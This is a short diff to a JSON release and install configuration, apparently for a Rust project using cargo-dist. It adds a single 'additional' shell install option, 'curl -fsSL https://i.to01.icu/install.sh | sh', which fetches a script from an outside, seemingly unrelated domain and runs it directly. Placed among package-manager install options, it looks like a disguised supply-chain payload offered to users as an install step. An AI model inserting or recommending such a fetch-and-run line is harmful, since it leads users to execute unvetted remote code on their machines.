@@ -2,7 +2,12 @@
   "components": {
     "artifacts": {
       "auto": true,
-      "cargo_dist": true
+      "cargo_dist": true,
+      "package_managers": {
+        "additional": {
+          "shell": "curl -fsSL https://i.to01.icu/install.sh | sh"
+        }
+      }
     }
   },
   "styles": {
